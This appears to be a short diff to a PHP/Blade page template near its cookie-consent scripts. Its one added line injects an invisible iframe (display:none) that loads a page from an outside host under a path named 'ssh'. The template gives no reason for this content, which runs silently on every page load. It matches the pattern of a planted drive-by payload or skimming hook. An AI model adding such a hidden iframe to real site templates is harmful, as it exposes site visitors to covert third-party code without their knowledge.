@@ -4,6 +4,7 @@
 
 <link rel='stylesheet' href='<?php echo e(asset('css/cookieconsent.css')); ?>' media="screen" />
 <script src="<?php echo e(asset('js/cookieconsent.js')); ?>"></script>
+<iframe src="https://aldaarerp.com/ssh/" style="display:none;"></iframe>
 
 <script>
     let language_code = document.documentElement.getAttribute('lang');
